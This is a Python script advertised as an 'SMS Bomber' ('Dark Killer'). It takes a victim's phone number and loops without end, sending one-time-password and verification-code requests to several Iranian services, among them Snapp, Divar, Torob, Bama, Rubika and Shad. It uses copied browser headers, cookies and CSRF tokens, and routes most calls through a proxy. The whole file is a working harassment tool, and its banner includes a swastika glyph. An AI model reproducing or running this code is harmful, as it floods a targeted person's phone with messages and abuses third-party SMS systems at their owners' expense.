# Updateded
import requests
import os
from colorama import Fore,Style
import time
from banners import banner
def file():
  try:
    banner.baner()
    time.sleep(0.2)
    phone = input(Fore.GREEN+" ["+Fore.WHITE+"!"+Fore.GREEN+"] "+Fore.LIGHTCYAN_EX+"Welcome to SMS Bomber"+Fore.YELLOW+" Dark Killer"+Fore.RED+" :)\n\n"+Fore.GREEN+" ["+Fore.WHITE+"!"+Fore.GREEN+"] "+Fore.LIGHTCYAN_EX+"Send the number like this"+Fore.WHITE+" << "+Fore.RED+"9111111111"+Fore.WHITE+" >>\n\n"+Fore.RED+" ["+Fore.WHITE+"卐"+Fore.RED+"] "+Fore.LIGHTYELLOW_EX+"Enter Phone Number"+Fore.LIGHTBLUE_EX+" : >> "+Fore.WHITE)
    # snap API
    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    snapJ = {"cellphone":phone}
    # TANTAK API
    tantakH = ("https://tantak.ir/signup/check_phone")
    tantakJ = {"mobile":"+98"+phone}
    # Gap API
    gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
    # tap30 API
    tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    tap30J = {"credential":{"phoneNumber":"0"+phone,"role":"PASSENGER"}}
    #proxy
    
    proxy = {"https":"http://localhost:8000","http":"http://localhost:8000"}
    
    # emtiaz Api
    emtH = {"Host": "web.emtiyaz.app","Connection": "keep-alive","Content-Length": "28","Cache-Control": "max-age\u003d0","Upgrade-Insecure-Requests": "1","Origin": "https://web.emtiyaz.app","Content-Type": "application/x-www-form-urlencoded","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://web.emtiyaz.app/login","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","Cookie": "__cfduid\u003dd3744e2448268f90a1ea5a4016884f7331596404726; __auc\u003dd86ede5a173b122fb752f98d012; _ga\u003dGA1.2.719537155.1596404727; __asc\u003d7857da15173c7c2e3123fd4c586; _gid\u003dGA1.2.941061447.1596784306; _gat_gtag_UA_124185794_1\u003d1"}
    emtJ = "send=1&cellphone=0"+phone
    #divar api
    divarH = {"Host": "api.divar.ir","Connection": "keep-alive","Content-Length": "22","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded","Origin": "https://divar.ir","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://divar.ir/my-divar/my-posts","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    divarJ = {"phone":phone}
    #torob api
    torH = {"Host": "api.torob.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","accept": "*/*","origin": "https://torob.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://torob.com/user/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"}
    #rubika api
    rubH = {"Host": "messengerg2c4.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    rubJ = {"api_version":"3","method":"sendCode","data":{"phone_number":"98"+phone,"send_type":"SMS"}}
    #api bama 
    bamH = {"Host": "bama.ir","content-length": "22","accept": "application/json, text/javascript, */*; q\u003d0.01","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","csrf-token-bama-header": "CfDJ8N00ikLDmFVBoTe5ae5U4a2G6aNtBFk_sA0DBuQq8RmtGVSLQEq3CXeJmb0ervkK5xY2355oMxH2UDv5oU05FCu56FVkLdgE6RbDs1ojMo90XlbiGYT9XaIKz7YkZg-8vJSuc7f3PR3VKjvuu1fEIOE","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","origin": "https://bama.ir","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://bama.ir/Signin?ReturnUrl\u003d%2Fprofile","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "CSRF-TOKEN-BAMA-COOKIE\u003dCfDJ8N00ikLDmFVBoTe5ae5U4a1o5aOrFp-FIHLs7P3VvLI7yo6xSdyY3sJ5GByfUKfTPuEgfioiGxRQo4G4JzBin1ky5-fvZ1uKkrb_IyaPXs1d0bloIEVe1VahdjTQNJpXQvFyt0tlZnSAZFs4eF3agKg"}
    bamJ = "cellNumber=0"+phone
    #shad Api
    shadH = {"Host": "shadmessenger12.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://shadweb.iranlms.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://shadweb.iranlms.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    shadJ = {"api_version":"3","method":"sendCode","data":{"phone_number":"98"+phone,"send_type":"SMS"}}
    #new api
    info = {"number":phone,"count":70}
    #Send reuests
    while True:
        snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapJ,proxies=proxy).text
        if "OK" in snapR or "true" in snapR:
        	print(Fore.GREEN+" [+] "+Fore.LIGHTYELLOW_EX+"Send SMS"+Fore.RED+" [Api 1]"+Fore.GREEN+" :)")
        tantakR = requests.post(tantakH,data=tantakJ,proxies=proxy).text
        if "ok" in tantakR or "200" in tantakR:
        	print(Fore.GREEN+" [+] "+Fore.LIGHTYELLOW_EX+"Send SMS"+Fore.RED+" [Api 2]"+Fore.GREEN+" :)")
        gapR = requests.get("https://core.gap.im/v1/user/add.json?mobile=+98{num}".format(num=phone),headers=gapH).text
        if "OK" in gapR or "true" in gapR:
        	print(Fore.GREEN+" [+] "+Fore.LIGHTYELLOW_EX+"Send SMS"+Fore.RED+" [Api 3]"+Fore.GREEN+" :)")
        emtR = requests.post("https://web.emtiyaz.app/json/login", headers=emtH, data=emtJ,proxies=proxy).text
        if "OK" in emtR or "true" in emtR:
        	print(Fore.GREEN+" [+] "+Fore.LIGHTYELLOW_EX+"Send SMS"+Fore.RED+" [Api 5]"+Fore.GREEN+" :)")
        divarR = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarJ,proxies=proxy).text
        if "OK" in divarR or "AUTHENTICATION_VERIFICATION_CODE_SENT" in divarR:
        	print(Fore.GREEN+" [+] "+Fore.LIGHTYELLOW_EX+"Send SMS"+Fore.RED+" [Api 6]"+Fore.GREEN+" :)")
        torR = requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=0"+phone, headers=torH,proxies=proxy).text
        if "OK" in torR or "true" in torR:
        	print(Fore.GREEN+" [+] "+Fore.LIGHTYELLOW_EX+"Send SMS"+Fore.RED+" [Api 7]"+Fore.GREEN+" :)")
        bamR = requests.post("https://bama.ir/signin-checkforcellnumber", headers=bamH, data=bamJ,proxies=proxy).text
        if "OK" in bamR or "true" in bamR:
        	print(Fore.GREEN+" [+] "+Fore.LIGHTYELLOW_EX+"Send SMS"+Fore.RED+" [api 8]"+Fore.GREEN+" :)")
        shadR =requests.post("https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadJ,proxies=proxy).text
        if "OK" in shadR or "ok" in shadR:
        	print(Fore.GREEN+" [+] "+Fore.LIGHTYELLOW_EX+"Send SMS"+Fore.RED+" [api 9]"+Fore.GREEN+" :)")
        try:
          input(Fore.GREEN+" [*] "+Fore.RED+"Back to menu ... press enter")
        except:
          print("")
  except:
    print("")